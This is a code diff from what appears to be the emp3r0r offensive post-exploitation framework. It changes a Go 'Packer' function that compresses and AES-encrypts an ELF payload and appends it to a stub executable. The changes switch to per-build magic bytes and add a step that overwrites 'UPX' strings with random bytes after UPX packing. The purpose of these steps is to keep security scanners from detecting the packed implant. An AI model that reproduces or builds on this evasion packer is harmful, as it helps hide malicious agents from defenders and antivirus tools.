@@ -9,7 +9,6 @@ import (
 	"io/ioutil"
 	"os"
 	"os/exec"
-	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -20,6 +19,8 @@ import (
 // Packer compress and encrypt ELF, append it to packer_stub.exe
 // encryption key is generated from MagicString
 func Packer(inputELF string) (err error) {
+	magic_str := string(emp3r0r_data.OneTimeMagicBytes)
+
 	// read file
 	elfBytes, err := ioutil.ReadFile(inputELF)
 	if err != nil {
@@ -44,20 +45,20 @@ func Packer(inputELF string) (err error) {
 	CliPrintInfo("ELF compressed: %d bytes (%.2f%%)", int(newSize), (newSize/origSize)*100)
 
 	// encrypt
-	key := tun.GenAESKey(emp3r0r_data.MagicString)
+	key := tun.GenAESKey(magic_str)
 	encELFBytes := tun.AESEncryptRaw(key, bufCompress.Bytes())
 	if encELFBytes == nil {
 		return fmt.Errorf("failed to encrypt %s", inputELF)
 	}
 
 	// append to stub
-	stub_file := EmpBuildDir + "/packer_stub.exe"
+	stub_file := emp3r0r_data.Packer_Stub
 	packed_file := fmt.Sprintf("%s.packed.exe", inputELF)
 	toWrite, err := ioutil.ReadFile(stub_file)
 	if err != nil {
 		return fmt.Errorf("cannot read %s: %v", stub_file, err)
 	}
-	sep := []byte(strings.Repeat(emp3r0r_data.MagicString, 3))
+	sep := bytes.Repeat(emp3r0r_data.OneTimeMagicBytes, 3)
 	toWrite = append(toWrite, sep...)
 	toWrite = append(toWrite, encELFBytes...)
 	toWrite = append(toWrite, sep...)
@@ -74,6 +75,16 @@ func Packer(inputELF string) (err error) {
 		if err != nil {
 			return fmt.Errorf("Packer: upx: %s (%v)", out, err)
 		}
+	}
+
+	// remove "UPX" strings
+	util.ReplaceBytesInFile(packed_file, []byte("UPX"), util.RandBytes(3))
+	util.ReplaceBytesInFile(packed_file, []byte("upx"), util.RandBytes(3))
+
+	// append magic string to binary
+	err = util.AppendToFile(packed_file, emp3r0r_data.OneTimeMagicBytes)
+	if err != nil {
+		CliPrintWarning("Appending magic string to %s: %v", packed_file, err)
 	}
 
 	// done
